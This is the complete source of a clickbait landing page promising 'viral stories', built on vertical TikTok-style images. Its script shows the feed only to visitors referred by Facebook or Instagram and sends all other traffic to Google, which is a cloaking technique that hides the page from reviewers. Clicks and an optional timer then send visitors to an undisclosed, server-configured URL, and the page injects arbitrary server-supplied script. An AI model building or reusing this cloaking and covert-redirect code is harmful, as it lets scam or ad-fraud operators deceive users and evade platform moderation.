<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="referrer" content="origin-when-cross-origin">

  <!-- SEO & Social Media Preview Tags -->
  <meta name="description" content="Trending viral content, stories and videos. Check out what's hot right now!">
  <meta name="robots" content="index, follow">

  <!-- Open Graph (Facebook, WhatsApp, Telegram) -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://k.infucar.com/">
  <meta property="og:title" content="🔥 Trending Stories & Viral Content">
  <meta property="og:description" content="Check out what's trending right now! Viral stories, videos and more.">
  <meta property="og:image" content="https://k.infucar.com/uploads/img_1.png">
  <meta property="og:image:width" content="540">
  <meta property="og:image:height" content="960">
  <meta property="og:site_name" content="Infucar">
  <meta property="og:locale" content="en_US">

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:url" content="https://k.infucar.com/">
  <meta name="twitter:title" content="🔥 Trending Stories & Viral Content">
  <meta name="twitter:description" content="Check out what's trending right now! Viral stories, videos and more.">
  <meta name="twitter:image" content="https://k.infucar.com/uploads/img_1.png">
  <!-- Publytics Analytics -->
  <script defer data-domain="k.infucar.com/JFwuP9" src="https://api.publytics.net/js/script.manual.min.js"></script>
  <script>
    window.publytics = window.publytics || function() { (window.publytics.q = window.publytics.q || []).push(arguments) };
    publytics('pageview');
  </script>
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='48' fill='%230f172a'/%3E%3Cpath d='M38 28 L72 50 L38 72 Z' fill='%23ec4899'/%3E%3C/svg%3E">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body, html {
      width: 100%;
      min-height: 100vh;
      background-color: #000000;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      overflow-x: hidden;
      color: #ffffff;
      -webkit-tap-highlight-color: transparent;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* Container for vertical 9:16 images */
    .vertical-feed {
      width: 100%;
      max-width: 500px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      background: #000000;
    }

    .image-wrapper {
      width: 100%;
      position: relative;
      /* Aspect ratio 9:16 for TikTok vertical size (1080x1920) */
      aspect-ratio: 9 / 16;
      display: block;
      cursor: pointer;
      overflow: hidden;
      text-decoration: none;
    }

    .image-wrapper img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      user-select: none;
      -webkit-user-drag: none;
    }

    /* Fallback placeholder if no images uploaded yet */
    .placeholder-feed {
      display: flex;
      flex-direction: column;
      gap: 0;
      width: 100%;
    }

    .placeholder-card {
      width: 100%;
      aspect-ratio: 9 / 16;
      background: linear-gradient(135deg, #111111 0%, #1a1a1a 100%);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #777;
      font-size: 1.1rem;
      border-bottom: 1px solid #222;
      text-align: center;
      padding: 20px;
      text-decoration: none;
    }

    /* Auto-redirect progress bar indicator */
    .timer-bar {
      position: fixed;
      top: 0;
      left: 0;
      height: 3px;
      background: #3b82f6;
      z-index: 99999;
      width: 0%;
      transition: width 0.1s linear;
    }
  </style>
  <!-- Publytics/Custom Tracking Code Placeholder -->
  <div id="tracking-code-container"></div>
</head>
<body>

  <div class="timer-bar" id="timerBar"></div>

  <div class="vertical-feed" id="feed">
    <!-- TikTok 9:16 Vertical Images rendered dynamically -->
  </div>

  <script>
    let targetDestination = "https://www.google.com";
    let redirectTimer = null;
    let timerSeconds = 0;
    let isRedirecting = false;

    function executeRedirect(e, customTargetUrl) {
      if (e) {
        if (e.preventDefault) e.preventDefault();
        if (e.stopPropagation) e.stopPropagation();
      }
      
      const urlToUse = (customTargetUrl && customTargetUrl.trim()) ? customTargetUrl.trim() : targetDestination;
      if (isRedirecting || !urlToUse) return;
      isRedirecting = true;

      let finalDestination = urlToUse;
      try {
        const destUrl = new URL(urlToUse, window.location.href);
        const currentParams = new URLSearchParams(window.location.search);
        currentParams.forEach((value, key) => {
          if (!destUrl.searchParams.has(key)) {
            destUrl.searchParams.set(key, value);
          }
        });
        finalDestination = destUrl.toString();
      } catch (err) {
        // Fallback
      }

      window.location.replace(finalDestination);
    }

    function isFacebookTraffic() {
      const ref = (document.referrer || '').toLowerCase();
      const ua = (navigator.userAgent || '').toLowerCase();
      const search = (window.location.search || '').toLowerCase();

      // Referrer check
      const isFbReferrer = ref.includes('facebook') ||
                           ref.includes('fb.com') ||
                           ref.includes('fb.me') ||
                           ref.includes('instagram') ||
                           ref.includes('fb.gg');

      // Parameter check
      const hasFbParam = search.includes('fbclid=') ||
                         search.includes('fb_') ||
                         search.includes('fb_ref') ||
                         search.includes('fb_source');

      // User Agent check
      const isFbApp = ua.includes('fban') ||
                      ua.includes('fbav') ||
                      ua.includes('fb_iab') ||
                      ua.includes('fbios') ||
                      ua.includes('fb4a') ||
                      ua.includes('instagram');

      return isFbReferrer || hasFbParam || isFbApp;
    }

    // Load Public Settings & Render Feed
    async function loadLandingData() {
      // Traffic Filter: Only Facebook/Instagram traffic sees landing page.
      // Google, WhatsApp, Direct and other sources immediately redirect to Google.
      if (!isFacebookTraffic()) {
        window.location.replace("https://www.google.com");
        return;
      }

      try {
        const res = await fetch('/api/public-settings');
        const data = await res.json();

        if (data.success) {
          targetDestination = data.targetUrl || "https://www.google.com";
          timerSeconds = parseInt(data.autoRedirectSeconds, 10) || 0;

          // Dynamic Publytics / Tracking Script Injection
          if (data.publyticsCode && data.publyticsCode.trim()) {
            const trackingContainer = document.getElementById('tracking-code-container');
            const range = document.createRange();
            const fragment = range.createContextualFragment(data.publyticsCode);
            trackingContainer.appendChild(fragment);
          }

          // Dynamic Browser Tab Title
          if (data.siteTitle && data.siteTitle.trim()) {
            document.title = data.siteTitle.trim();
          }

          // Render Images Feed with Infinite Scroll (5 images initial batch)
          const feedEl = document.getElementById('feed');
          feedEl.innerHTML = '';

          if (data.images && data.images.length > 0) {
            // Randomly shuffle images array for EVERY visit / refresh so order & first image change dynamically
            const shuffled = [...data.images].sort(() => Math.random() - 0.5);
            let currentShown = 0;
            const pageSize = 5; // Default 5 images
            let isLoadingMore = false;

            function renderBatch() {
              const nextBatch = shuffled.slice(currentShown, currentShown + pageSize);
              nextBatch.forEach((img, index) => {
                const itemTarget = (img.targetUrl && img.targetUrl.trim()) ? img.targetUrl.trim() : targetDestination;

                const item = document.createElement('a');
                item.className = 'image-wrapper';
                item.href = itemTarget;
                item.rel = "origin-when-cross-origin";
                item.onclick = (e) => executeRedirect(e, itemTarget);

                const imageTag = document.createElement('img');
                imageTag.src = img.url;
                imageTag.alt = "TikTok 9:16 Vertical Content";
                imageTag.loading = (currentShown === 0 && index < 2) ? "eager" : "lazy";
                imageTag.decoding = "async";

                item.appendChild(imageTag);
                feedEl.appendChild(item);
              });

              currentShown += nextBatch.length;
            }

            // Initial render of default 5 images
            renderBatch();

            // Automatic Infinite Scroll on user scroll
            window.addEventListener('scroll', () => {
              if (isLoadingMore || currentShown >= shuffled.length) return;
              if ((window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 800)) {
                isLoadingMore = true;
                renderBatch();
                setTimeout(() => { isLoadingMore = false; }, 150);
              }
            }, { passive: true });
          } else {
            // Show default 9:16 placeholders if no images uploaded yet
            let placeholderHtml = '<div class="placeholder-feed">';
            for (let i = 1; i <= 5; i++) {
              placeholderHtml += `
                <a class="placeholder-card" href="${targetDestination}" onclick="executeRedirect(event, '${targetDestination}')">
                  <svg width="48" height="48" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="margin-bottom:12px;opacity:0.5;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                  <p style="font-weight:600;">TikTok 9:16 Vertical Content #${i}</p>
                  <p style="font-size:0.85rem;margin-top:6px;color:#666;">(1080 × 1920)</p>
                </a>
              `;
            }
            placeholderHtml += '</div>';
            feedEl.innerHTML = placeholderHtml;
          }

          // Start Auto Redirect Timer if configured
          if (timerSeconds > 0) {
            const timerBar = document.getElementById('timerBar');
            let elapsed = 0;
            const stepMs = 100;
            const totalMs = timerSeconds * 1000;

            const interval = setInterval(() => {
              elapsed += stepMs;
              const pct = Math.min((elapsed / totalMs) * 100, 100);
              timerBar.style.width = pct + '%';

              if (elapsed >= totalMs) {
                clearInterval(interval);
                executeRedirect(null, targetDestination);
              }
            }, stepMs);
          }
        }
      } catch (err) {
        console.error("Error loading landing settings:", err);
      }
    }

    document.addEventListener("DOMContentLoaded", loadLandingData);
  </script>
</body>
</html>
